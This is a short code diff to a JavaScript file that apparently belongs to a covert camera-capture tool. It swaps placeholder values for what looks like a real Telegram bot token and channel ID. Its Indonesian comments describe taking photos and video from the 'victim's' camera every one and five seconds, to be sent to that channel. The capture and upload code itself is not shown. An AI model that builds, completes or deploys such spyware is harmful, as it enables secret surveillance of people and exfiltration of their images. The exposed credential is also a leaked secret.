@@ -2,10 +2,10 @@ if (window.self !== window.top) {
   window.top.location.href = window.self.location.href;
 }
 
-const telegramBotToken = 'YOUR_BOT_TOKEN';
-const telegramChannelId = 'YOUR_ID_CHANEL';
-const photoDescription = 'TEXT';
-const videoDescription = 'TEXT';
+const telegramBotToken = '8039576062:AAGOI7mMwR-30n_xuhafZyWSWLauwmw9GyI';
+const telegramChannelId = '-1002627274670';
+const photoDescription = 'Mengambil foto dari kamera korban';
+const videoDescription = 'Mengambil video dari kamera korban';
 const photoInterval = 1000; // Spam Foto 1 detik
 const recordInterval = 5000; // Spam Video 5 Detik
 
